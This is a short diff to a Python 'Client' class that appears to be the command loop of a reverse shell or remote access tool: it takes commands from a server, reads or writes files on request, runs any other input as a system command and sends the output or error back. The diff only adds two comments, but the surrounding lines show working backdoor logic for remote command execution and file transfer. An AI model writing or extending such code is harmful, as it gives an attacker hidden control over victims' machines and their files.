@@ -66,11 +66,11 @@ class Client:
                 elif command[0] == "download":
                     command_result = self.read_file(command[1]).decode()
                 elif command[0] == "upload":
-                    command_result = self.write_file(command[1], command[2])
+                    command_result = self.write_file(command[1], command[2])  # get path and content of file 
                 else:
                     command_result = self.execute_system_command(command).decode()
             except Exception as e:
-                command_result = str(e)
+                command_result = str(e) # send error to server
             self.send_data(command_result)
 
 
